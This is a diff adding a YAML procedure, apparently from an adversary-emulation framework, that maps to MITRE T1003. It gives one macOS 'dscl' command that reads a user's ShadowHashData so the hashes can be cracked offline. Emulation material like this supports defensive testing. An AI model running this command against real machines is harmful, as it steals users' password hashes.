@@ -1,0 +1,17 @@
+id: 6044fb78-5d7b-43cc-9592-dcba3c4537f1
+name: Dump ShadowHashData
+description: This procedure uses the Directory Service command line utility to dump encrypted shadow data for offline cracking.
+tactic: credential-access
+technique:
+  id: T1003
+  name: OS Credential Dumping
+platforms:
+  darwin:
+    sh:
+      command: 'dscl . read /Users/#{T1087.001} ShadowHashData'
+metadata:
+  authors:
+    - bfuzzy1
+  tags: []
+  version: 1
+  enabled: true
